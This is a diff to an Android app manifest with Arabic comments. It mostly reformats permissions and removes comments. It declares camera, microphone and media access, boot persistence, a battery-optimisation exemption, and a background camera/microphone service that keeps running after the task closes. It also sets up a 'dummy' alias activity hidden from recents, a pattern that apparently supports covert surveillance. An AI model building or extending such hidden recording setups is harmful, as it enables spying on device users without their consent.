@@ -2,59 +2,34 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
 
-    <!-- الأذونات الأساسية للاتصال بالشبكة -->
+    <!-- الأذونات المطلوبة -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
-
-    <!-- أذونات الكاميرا والميكروفون -->
     <uses-permission android:name="android.permission.CAMERA" />
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
-
-    <!-- أذونات التخزين للوصول إلى الوسائط -->
     <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
     <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
     <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
-
-    <uses-permission
-        android:name="android.permission.READ_EXTERNAL_STORAGE"
-        android:maxSdkVersion="32" />
-
-    <uses-permission
-        android:name="android.permission.WRITE_EXTERNAL_STORAGE"
-        android:maxSdkVersion="28"
-        tools:ignore="ScopedStorage" />
-
-    <!-- أذونات الإشعارات والخدمات -->
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" android:maxSdkVersion="28" tools:ignore="ScopedStorage" />
+    
+    <!-- أذونات الخدمات الأمامية والبطارية -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
-
-    <!-- أذونات إضافية للمساعدة في استقرار الخدمات الخلفية -->
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.VIBRATE" />
 
-    <!-- ميزات الجهاز (جميعها اختيارية) -->
-    <uses-feature
-        android:name="android.hardware.camera"
-        android:required="false" />
-    <uses-feature
-        android:name="android.hardware.camera.autofocus"
-        android:required="false" />
-    <uses-feature
-        android:name="android.hardware.microphone"
-        android:required="false" />
-    <uses-feature
-        android:name="android.hardware.wifi"
-        android:required="false" />
+    <uses-feature android:name="android.hardware.camera" android:required="false" />
+    <uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />
+    <uses-feature android:name="android.hardware.microphone" android:required="false" />
+    <uses-feature android:name="android.hardware.wifi" android:required="false" />
 
-    <!-- ============================================================
-         التطبيق
-    ============================================================ -->
     <application
         android:allowBackup="false"
         android:allowClearUserData="true"
@@ -70,9 +45,7 @@
         tools:ignore="GoogleAppIndexingWarning"
         tools:targetApi="34">
 
-        <!-- ============================================================
-             ✅ النشاط الوهمي (Alias) – نقطة الدخول الوحيدة المرئية
-        ============================================================ -->
+        <!-- ✅ النشاط الوهمي -->
         <activity-alias
             android:name=".MainActivityAlias"
             android:targetActivity=".MainActivity"
@@ -86,9 +59,7 @@
             </intent-filter>
         </activity-alias>
 
-        <!-- ============================================================
-             ✅ النشاط الحقيقي – تم تعديل exported إلى true
-        ============================================================ -->
+        <!-- ✅ النشاط الحقيقي – تم إزالة noHistory و finishOnTaskLaunch -->
         <activity
             android:name=".MainActivity"
             android:configChanges="orientation|screenSize|keyboardHidden"
@@ -99,14 +70,10 @@
             android:excludeFromRecents="true"
             android:taskAffinity=""
             android:documentLaunchMode="never"
-            android:noHistory="true"
-            android:finishOnTaskLaunch="true"
             android:stateNotNeeded="true"
             android:allowTaskReparenting="false" />
 
-        <!-- ============================================================
-             ✅ الخدمة الأمامية
-        ============================================================ -->
+        <!-- ✅ الخدمة الأمامية مع foregroundServiceType -->
         <service
             android:name=".ForegroundService"
             android:foregroundServiceType="dataSync|camera|microphone"
@@ -114,9 +81,6 @@
             android:enabled="true"
             android:stopWithTask="false" />
 
-        <!-- ============================================================
-             ✅ مستقبل البث عند بدء التشغيل
-        ============================================================ -->
         <receiver
             android:name=".BootReceiver"
             android:enabled="true"
